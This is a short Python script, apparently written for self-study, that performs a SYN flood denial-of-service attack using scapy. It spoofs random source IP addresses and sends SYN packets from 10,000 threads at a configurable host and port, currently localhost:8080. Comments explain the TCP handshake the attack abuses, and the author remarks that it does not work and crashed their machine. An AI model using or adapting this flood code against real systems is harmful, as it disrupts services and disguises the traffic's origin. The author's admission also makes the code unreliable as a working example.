#!/usr/bin/env python3
# Runs a SYN flood, which is a protocol DoS attack
# TCP server connections are estiblished through a
# three-way handshake:
# - Client sends a SYN packet to initialise
# - Server acknowledges requets with a SYN-ACK packet
# - Client completes hand-shake with ACK packet
# Attempts to use up a server's resources by sending
# SYN packets which the server responds with SYN-ACK
# packets but never receives the expected ACK packet
# Needs to be run with elevated privileges (sudo)

# - Run with
#   $ sudo ./syn_flood.py
# Doesn't work :(
# Maybe there's some built in SYN protection somewhere
# but I'm not going to try anymore because I also just
# broke my computer
from scapy.all import *
from random import randint
import threading


TARGET_HOST, TARGET_PORT = '127.0.0.1', 8080
NUM_THREADS = 10_000


terminate_signal = threading.Event()


def send_syn_packet() -> str:
    source_ip = '.'.join(map(str, (randint(1, 255) for _ in range(4))))
    source_port = randint(1024, 65535)
    seq_num = randint(1000, 9000)

    ip = IP(src=source_ip, dst=TARGET_HOST)
    tcp = TCP(sport=source_port, dport=TARGET_PORT, flags='S', seq=seq_num)
    packet = ip / tcp

    send(packet, verbose=0)
    return source_ip


def syn_flood() -> None:
    while not terminate_signal.is_set():
        try:
            source_ip = send_syn_packet()
            print(f'Sent an SYN packet from {source_ip}')
        except Exception as error:
            print(f'Error: {error}')
            break


if __name__ == '__main__':
    try:
        threads = []
        for _ in range(NUM_THREADS):
            thread = threading.Thread(target=syn_flood)
            thread.start()
            threads.append(thread)
    except KeyboardInterrupt:
        terminate_signal.set()
        for thread in threading.enumerate():
            if thread is not threading.current_thread():
                thread.join()
